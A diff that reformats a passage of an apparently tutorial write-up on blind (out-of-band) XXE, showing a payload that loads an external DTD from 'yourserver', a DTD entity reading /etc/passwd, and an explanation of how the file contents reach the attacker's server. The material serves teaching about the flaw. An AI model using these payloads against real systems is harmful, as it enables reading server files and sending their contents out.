@@ -37,7 +37,9 @@ The xml parser will process this payload as same as above but instead of request
 Still you can confirm the existence of the vulnerability by using the first payload above. But you can't see the file contents of local files of webserver. This is still an issue but now the severity is a ***little bit low.*** And, this is called Blind XXE OR Out-of-band XXE.
 
 So we also needed to blind means we have to use blind payload.
+
 `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % test SYSTEM 'http://yourserver/xml.dtd'> %test; %exe]><root>&entity;</root>`
+
 Your xml.dtd contents:- 
 
 `<!ENTITY % file SYSTEM "file:///etc/passwd">`
@@ -45,13 +47,13 @@ Your xml.dtd contents:-
 
 Lot's of code to understand:-
 
-we are using External dtd file i.e. `%test;`. So first the xml parser will parse this entity and make a request to your web-server for getting the contents of dtd file. Now, in that dtd file we define some entities to process. 
-
-`%exe;` will make another general entity i.e. &entity; and that entity will make a request to our server with the *file contents.* which was found by the `%file;`
-
-When the xml parser parses the entity `%file;`, then that entity will grep the file contents of local files of the server (which is our main target). 
-
-Now attacker can log the request and reconstruct the file contents. 
+> we are using External dtd file i.e. `%test;`. So first the xml parser will parse this entity and make a request to your web-server for getting the contents of dtd file. Now, in that dtd file we define some entities to process. 
+>
+> `%exe;` will make another general entity i.e. &entity; and that entity will make a request to our server with the *file contents.* which was found by the `%file;`
+>
+> When the xml parser parses the entity `%file;`, then that entity will grep the file contents of local files of the server (which is our main target). 
+>
+> Now attacker can log the request and reconstruct the file contents. 
 
 Make sense?
 
